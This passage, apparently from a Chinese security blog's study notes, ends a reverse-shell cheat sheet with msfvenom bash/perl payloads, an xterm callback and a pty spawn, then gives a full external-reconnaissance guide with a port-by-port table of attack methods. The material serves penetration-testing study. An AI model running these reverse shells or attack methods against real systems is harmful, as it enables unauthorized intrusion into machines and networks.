-p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl <span class="attribute">LHOST</span>=<span class="string">&quot;10.10.10.11&quot;</span> <span class="attribute">LPORT</span>=443 -f<span class="built_in"> raw </span>&gt; shell.pl</span><br></pre></td></tr></table></figure>

<h2 id="使用Xterm反弹shell"><a href="#使用Xterm反弹shell" class="headerlink" title="使用Xterm反弹shell"></a>使用Xterm反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>

<p>然后在靶机上执行如下命令：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">xterm</span> -display <span class="number">10.10.10.11:1</span></span><br><span class="line"><span class="attribute">Xnest</span> :<span class="number">1</span></span><br><span class="line"><span class="attribute">xhost</span> +targetip</span><br></pre></td></tr></table></figure>

<h2 id="获取TTY"><a href="#获取TTY" class="headerlink" title="获取TTY"></a>获取TTY</h2><p>python</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md">https://github.com/xuanhusec/OscpStudyGroup/blob/master/0x0004-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB.md</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>外网渗透信息收集</title>
    <url>/2022/02/10/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p><strong>什么是信息搜集？</strong></p>
<p>信息搜集也称踩点，信息搜集毋庸置疑就是尽可能的搜集目标的信息，包括端口信息、DNS信息、员工邮箱等等看似并不起眼的一些信息都算是信息搜集，这些看似微乎其微的信息，对于渗透测试而言就关乎到成功与否了。</p>
<span id="more"></span>

<p><strong>信息搜集的重要性</strong></p>
<p>信息搜集是渗透测试的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p>
<p><strong>信息搜集的分类</strong></p>
<table>
<thead>
<tr>
<th>主动式信息搜集（可获取到的信息较多，但易被目标发现）</th>
</tr>
</thead>
<tbody><tr>
<td>通过直接发起与被测目标网络之间的互动来获取相关信息，如通过Nmap扫描目标系统。</td>
</tr>
<tr>
<td>被动式信息搜集（搜集到的信息较少，但不易被发现）</td>
</tr>
<tr>
<td>通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</td>
</tr>
</tbody></table>
<h1 id="二、搜索引擎"><a href="#二、搜索引擎" class="headerlink" title="二、搜索引擎"></a>二、搜索引擎</h1><table>
<thead>
<tr>
<th>Google hacking</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fofa</td>
<td><a href="https://fofa.so/">https://fofa.so/</a></td>
</tr>
<tr>
<td>shodan—用来搜索网络空间中在线设备</td>
<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
</tr>
<tr>
<td>zoomeye—针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息</td>
<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
</tr>
</tbody></table>
<p><strong>Google hacking——常用搜索语法：</strong></p>
<table>
<thead>
<tr>
<th>intitle:KEYWORD</th>
<th>搜索网页标题中含有关键词的网页</th>
</tr>
</thead>
<tbody><tr>
<td>intext:KEYWORD</td>
<td>搜索站点正文中含有关键词的网页</td>
</tr>
<tr>
<td>inurl:KEYWORD</td>
<td>搜索URL中包含有指定字符串的网址</td>
</tr>
<tr>
<td>inurl:php?id=</td>
<td>搜索PHP网页</td>
</tr>
<tr>
<td>site:DOMAIN</td>
<td>在指定站点内查找相关的内容</td>
</tr>
<tr>
<td>filetype:FILE</td>
<td>搜索指定类型的文件</td>
</tr>
</tbody></table>
<p><strong>我们可以同时附加多个条件进行筛选，比如 inurl:admin intitle:农具<br>两个筛选条件之间用空格隔开</strong></p>
<p><strong>fofa|shodan|zoomeye——搜索语法</strong></p>
<table>
<thead>
<tr>
<th>app:nginx</th>
<th>组件名</th>
</tr>
</thead>
<tbody><tr>
<td>ver:1.0</td>
<td>版本</td>
</tr>
<tr>
<td>os:windows</td>
<td>操作系统</td>
</tr>
<tr>
<td>country:”China”</td>
<td>国家</td>
</tr>
<tr>
<td>city:”guangzhou”</td>
<td>城市</td>
</tr>
<tr>
<td>port:80</td>
<td>端口</td>
</tr>
<tr>
<td>hostname:google</td>
<td>主机名</td>
</tr>
<tr>
<td>site:thief.one</td>
<td>网站域名</td>
</tr>
<tr>
<td>desc:nmask</td>
<td>描述</td>
</tr>
<tr>
<td>keywords:nmask’blog</td>
<td>关键词</td>
</tr>
<tr>
<td>service:ftp</td>
<td>服务类型</td>
</tr>
<tr>
<td>ip:8.8.8.8</td>
<td>ip地址</td>
</tr>
<tr>
<td>cidr:8.8.8.8/24</td>
<td>ip地址段</td>
</tr>
</tbody></table>
<p>通过以上不同种类的搜索引擎我们可以获得相当多的有用的信息，甚至平时搜索东西我们也可以通过zoomeye来找到自己想要的东西</p>
<h1 id="三、企业信息"><a href="#三、企业信息" class="headerlink" title="三、企业信息"></a>三、企业信息</h1><table>
<thead>
<tr>
<th>天眼查</th>
<th align="center">能根据用户的不同需求，实现了企业背景、企业发展、司法风险、经营风险、经营状况、知识产权方面等多种数据维度的检索，例如：企业信用信息公示系统，工业和信息化部ICP/IP地址/域名信息备案管理系统等以上几个可以用来深入了解渗透目标网站所属企业的相关信息</th>
<th><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></th>
</tr>
</thead>
<tbody><tr>
<td>爱企查</td>
<td align="center"><em>爱企查</em>是百度推出的企业信用查询工具,提供一站式的企业信息实时查询,企业相关的工商信息查询,股东查询,主要成员查询,变更记录查询,网站备案查询,对外投资查询,分支机构查询,年报查询,风险警示查询等</td>
<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
</tr>
<tr>
<td>企查查</td>
<td align="center"><em>企查查</em>信息来自国家企业信用信息公示系统,提供企业信息查询,工商查询,企业信用评价查询,企业纠纷查询,企业现金流查询,企业股权查询,企业负债查询,企业资产查询,企业财报查询,公司查询等相关信息</td>
<td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td>
</tr>
<tr>
<td>kali下的whois</td>
<td align="center"></td>
<td></td>
</tr>
<tr>
<td>ICP备案查询网</td>
<td align="center"></td>
<td></td>
</tr>
</tbody></table>
<h1 id="四、域名信息收集"><a href="#四、域名信息收集" class="headerlink" title="四、域名信息收集"></a>四、域名信息收集</h1><p>当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。</p>
<p>判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。那么如何绕过CDN查找网站真实的ip地址呢？传送门——&gt; 绕过CDN查找网站真实ip</p>
<p>域名的whois信息：</p>
<p>通常，我们进行whois查询是去： 站长之家whois查询 。然后查出来信息之后，可以根据查询出来的邮箱、注册人、公司、电话等进行反查。</p>
<p>子域名、DNS记录查询：传送门——&gt; 子域名查询、DNS记录查询</p>
<p>公司敏感信息网上搜集<br>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。传送门——&gt; Github搜索语法</p>
<h1 id="五、whois信息"><a href="#五、whois信息" class="headerlink" title="五、whois信息"></a>五、whois信息</h1><p>whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。<br>whois信息可以获取关键注册人的信息，包括注册商、联系人、联系邮箱、联系电话、创建时间等,可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。<br><strong>常用的工具有：</strong>站长工具，爱站，微步在线</p>
<h1 id="六、-Nslookup"><a href="#六、-Nslookup" class="headerlink" title="六、 Nslookup"></a>六、 Nslookup</h1><p>1.设置类型为ns</p>
<p>2.下面的例子查询baidu.com使用的DNS服务器名称:</p>
<p>3.下面的例子展示如何查询baidu.com的邮件交换记录：</p>
<p>4.查看网站cname值。</p>
<p>5.查看邮件服务器记录（-qt=MX）</p>
<p>6.同样nslookup也可以验证是否存在域传送漏洞，步骤如下：</p>
<p>nslookup进入交互式模式<br>Server 设置使用的DNS服务器<br>ls命令列出某个域中的所有域名</p>
<h1 id="七、子域名收集"><a href="#七、子域名收集" class="headerlink" title="七、子域名收集"></a>七、子域名收集</h1><p>子域名收集可以发现更多渗透测试范围内的域名/子域名，以增加漏洞发现机率；探测到更多隐藏或遗忘的应用服务，这些应用往往可导致一些严重漏洞。<br>常用的工具有：子域名挖掘机Layer、subDomainsBrute、Dnsenum、Dnsmap …</p>
<p>这里推荐一个在线收集子域名的网站 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> 但是可能会出现遇到泛解析防御机制的情况</p>
<h1 id="八、真实IP获取"><a href="#八、真实IP获取" class="headerlink" title="八、真实IP获取"></a>八、真实IP获取</h1><p>现在大多数的网站都开启了CDN加速，导致我们获取到的IP地址不一定是真实的IP地址。</p>
<p><strong>什么是CDN呢？</strong></p>
<p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。<br>如果想获取真实IP，我们可以使用以下几种方法<br>1.多地Ping法：由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。这里推荐一个网站可以多个地点ping服务器，<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></p>
<p>2.二级域名法：目标站点一般不会把所有的二级域名放cdn上。通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</p>
<p>3.nslookup法：找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。</p>
<p>4.Ping法：直接ping example.com而不是<a href="http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/">www.example.com，因为现有很多CDN厂商基本只要求把www.example.com</a> cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。</p>
<p>5.在线资源：</p>
<ol>
<li><a href="https://wepcc.com/">全球Ping在线测试</a></li>
<li><a href="http://ping.chinaz.com/">站长工具-ping测试</a></li>
<li><a href="https://asm.ca.com/en/ping.php">CA</a></li>
<li><a href="https://dnsdumpster.com/">DNSDumpster</a></li>
<li><a href="https://ipchaxun.com/">IP查询</a></li>
<li><a href="https://viewdns.info/iphistory/">IPhistory</a></li>
<li><a href="https://securitytrails.com/">securitytrails</a></li>
<li><a href="https://sitereport.netcraft.com/">netcraft</a></li>
<li><a href="https://www.17ce.com/">17CE</a></li>
<li><strong>kali下的nslookup、dig</strong></li>
</ol>
<h1 id="九、指纹识别"><a href="#九、指纹识别" class="headerlink" title="九、指纹识别"></a>九、指纹识别</h1><p>通过识别目标网站所使用的操作系统、CMS、服务器与中间件信息，可以帮助我们进一步了解渗透测试环境，可以利用已知的一些CMS漏洞或中间件漏洞来进行攻击。在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</p>
<p>常见的网站指纹识别工具有：whatweb等。</p>
<p>在线指纹识别网站：</p>
<p>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a><br>整站分析</p>
<p>可以在以下地方获取信息：<br>1.指定路径下指定名称的js文件或代码。</p>
<p>2.指定路径下指定名称的css文件或代码。</p>
<p>5.display:none中的版权信息。</p>
<p>6.页面底部版权信息，关键字© Powered by等。</p>
<p>7.readme.txt、License.txt、help.txt等文件。</p>
<p>8.指定路径下指定图片文件，如一些小的图标文件，后台登录页面中的图标文件<br>等，一般管理员不会修改它们。</p>
<p>9.注释掉的html代码中&lt;!–</p>
<p>10.http头的X-Powered-By中的值，有的应用程序框架会在此值输出。</p>
<p>11.cookie中的关键字</p>
<p>12.robots.txt文件中的关键字，robots.txt 中禁止的路径很可能说明站点就有这些路径 而且robots.txt 多是可访问的</p>
<p>13.404页面</p>
<p>14.302返回时的旗标</p>
<h1 id="十、服务器类型-Linux-Windows"><a href="#十、服务器类型-Linux-Windows" class="headerlink" title="十、服务器类型(Linux/Windows)"></a>十、服务器类型(Linux/Windows)</h1><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
<p>而判断目标网站服务器的具体的版本的话，可以采用 <a href="https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020">nmap</a> 进行扫描， -O 和 -A 参数都能扫描出来</p>
<p>通过大小写判断</p>
<p>访问网站：<br><a href="http://www.xxx.com/index.html">http://www.xxx.com/index.html</a><br><a href="http://www.xxx.com/inDex.html">http://www.xxx.com/inDex.html</a><br>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</p>
<p>工具 ：云悉指纹、Whatweb、httprint、Bugscanner、浏览器插件 wappalyzer</p>
<p>有的时候HTTP返回报文的server也可能泄露相关信息</p>
<h1 id="十一、网站容器（Apache-Nginx-Tomcat-IIS）"><a href="#十一、网站容器（Apache-Nginx-Tomcat-IIS）" class="headerlink" title="十一、网站容器（Apache/Nginx/Tomcat/IIS）"></a>十一、网站容器（Apache/Nginx/Tomcat/IIS）</h1><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<h1 id="十二、脚本类型-php-jsp-asp-aspx"><a href="#十二、脚本类型-php-jsp-asp-aspx" class="headerlink" title="十二、脚本类型(php/jsp/asp/aspx)"></a>十二、脚本类型(php/jsp/asp/aspx)</h1><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<p>1：可以根据网站URL来判断</p>
<p>2：site:xxx filetype:php</p>
<p>3：可以根据Firefox的插件来判断</p>
<h1 id="十三、数据库类型-Mysql-Oracle-Accees-Mqlserver"><a href="#十三、数据库类型-Mysql-Oracle-Accees-Mqlserver" class="headerlink" title="十三、数据库类型(Mysql/Oracle/Accees/Mqlserver)"></a>十三、数据库类型(Mysql/Oracle/Accees/Mqlserver)</h1><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的。</p>
<p>几种数据库的区别：</p>
<ol>
<li>Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库</li>
<li>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf</li>
<li>MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306</li>
<li>Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521</li>
</ol>
<p>access是不要钱的，access支持千以内的访问量，access是小型数据库</p>
<p>mysql也是开源的，mysql 是中小型数据库</p>
<p>sql server 是收费的一般也就几千，sql server支持几千到上万的访问，sql server是中型数据库</p>
<p>Oracle的费用则数万，Oracle则支持海量的访 问，Oracle是大型数据库</p>
<p>常见搭配：</p>
<p>ASP 和 ASPX：ACCESS、SQL Server<br>PHP：MySQL、PostgreSQL<br>JSP：Oracle、MySQL<br>主机扫描(Nessus)<br>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>
<p>主机扫描的工具也有很多，比如：Nessus</p>
<h1 id="十四、端口扫描"><a href="#十四、端口扫描" class="headerlink" title="十四、端口扫描"></a>十四、端口扫描</h1><p>扫描端口可以使用Nmap，masscan进行扫描探测，尽可能多的搜集开启的端口好已经对应的服务版本，得到确切的服务版本后可以搜索有没有对应版本的漏洞。<br>常见的端口信息及渗透方法：</p>
<table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>tcp 20,21</td>
<td>FTP</td>
<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td>SSH</td>
<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
</tr>
<tr>
<td>tcp 23</td>
<td>Telnet</td>
<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
</tr>
<tr>
<td>tcp 25</td>
<td>SMTP</td>
<td>邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
</tr>
<tr>
<td>tcp/udp 53</td>
<td>DNS</td>
<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
</tr>
<tr>
<td>tcp/udp 69</td>
<td>TFTP</td>
<td>尝试下载目标及其的各类重要配置文件</td>
</tr>
<tr>
<td>tcp 80-89,443,8440-8450,8080-8089</td>
<td>各种常用的Web服务端口</td>
<td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td>
</tr>
<tr>
<td>tcp 110</td>
<td>POP3</td>
<td>可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 111,2049</td>
<td>NFS</td>
<td>权限配置不当</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td>Samba</td>
<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td>IMAP</td>
<td>可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td>SNMP</td>
<td>爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td>LDAP</td>
<td>ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td>Linux rexec</td>
<td>可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td>Rsync</td>
<td>匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td>OpenVPN</td>
<td>想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td>Lotus</td>
<td>弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td>SQL Server</td>
<td>注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td>Oracle</td>
<td>tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td>ISPmanager</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 1723</td>
<td>PPTP</td>
<td>爆破,想办法钓VPN账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td>cPanel</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td>ZooKeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 2601,2604</td>
<td>Zebra</td>
<td>默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td>Squid</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td>kangle</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td>MySQL</td>
<td>注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td>Windows rdp</td>
<td>shift后门[需要03以下的系统],爆破,ms12-020</td>
</tr>
<tr>
<td>tcp 3690</td>
<td>SVN</td>
<td>svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 4848</td>
<td>GlassFish</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 5000</td>
<td>Sybase/DB2</td>
<td>爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td>PostgreSQL</td>
<td>爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td>VNC</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>tcp 5984</td>
<td>CouchDB</td>
<td>未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td>Redis</td>
<td>可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td>WebLogic</td>
<td>Java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td>Kloxo</td>
<td>主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td>Ajenti</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td>Plesk</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td>Zabbix</td>
<td>远程执行,SQL注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td>Jenkins,JBoss</td>
<td>反序列化,控制台弱口令</td>
</tr>
<tr>
<td>tcp 9080-9081,9090</td>
<td>WebSphere</td>
<td>Java反序列化/弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td>ElasticSearch</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 11211</td>
<td>Memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td>MongoDB</td>
<td>爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td>Hadoop</td>
<td>默认端口未授权访问</td>
</tr>
</tbody></table>
<h1 id="十五、Nmap"><a href="#十五、Nmap" class="headerlink" title="十五、Nmap"></a>十五、Nmap</h1><p>Nmap是一个网络连接端口扫描软件，用来扫描网上电脑开放的网络连接端口。确定哪些服务运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>功能:<br>1、 主机发现<br>2、 端口扫描<br>3、 版本侦测<br>4、 OS侦测</p>
<h1 id="十六、旁站C段查询"><a href="#十六、旁站C段查询" class="headerlink" title="十六、旁站C段查询"></a>十六、旁站C段查询</h1><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>
<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<p>旁站和C段在线查询地址：</p>
<p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p>
<p>旁站：是和目标网站在同一台服务器上的其它的网站。</p>
<p>旁注：通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。</p>
<p>工具：K8_C段旁注工具、WebRobot、御剑、明小子 …</p>
<p>C段：每个IP有ABCD四个段，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务。比如192.168.3.0-255的设备都处于同一个c段。</p>
<p>C段入侵：目标ip为192.168.1.128，可以入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。</p>
<p>工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff …</p>
<h1 id="十七、其他信息"><a href="#十七、其他信息" class="headerlink" title="十七、其他信息"></a>十七、其他信息</h1><p>Web敏感文件<br>robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件 …</p>
<p>WAF信息<br>WAF识别大多基于Headers头信息，还可以使用Wafw00f，Sqlmap的waf脚本，Nmap的http-waf-detect和http-waf-fingerprint脚本等等。</p>
<p>相关漏洞<br>漏洞查询站点：exploitdb、hackerone、CNVD、0day5、乌云漏洞库镜像站 …</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>
<p>后台目录：弱口令，万能密码，爆破<br>安装包：获取数据库信息，甚至是网站源码<br>上传目录：截断、上传图片马等<br>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell<br>安装页面 ：可以二次安装进而绕过<br>phpinfo：会把你配置的各种信息暴露出来<br>富文本编辑器<br>iis短文件利用：条件比较苛刻 windows、apache等</p>
<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可<br>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。<br>假如编写的robots.txt文件内容如下：</p>
<p>User-agent: *<br>Disallow: /data/<br>Disallow: /db/<br>Disallow: /admin/<br>Disallow: /manager/<br>Allow:/images/<br>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>安全小白怎么从零开始拥有自己的武器库</title>
    <url>/2022/01/20/%E5%AE%89%E5%85%A8%E5%B0%8F%E7%99%BD%E6%80%8E%E4%B9%88%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%8B%A5%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AD%A6%E5%99%A8%E5%BA%93/</url>
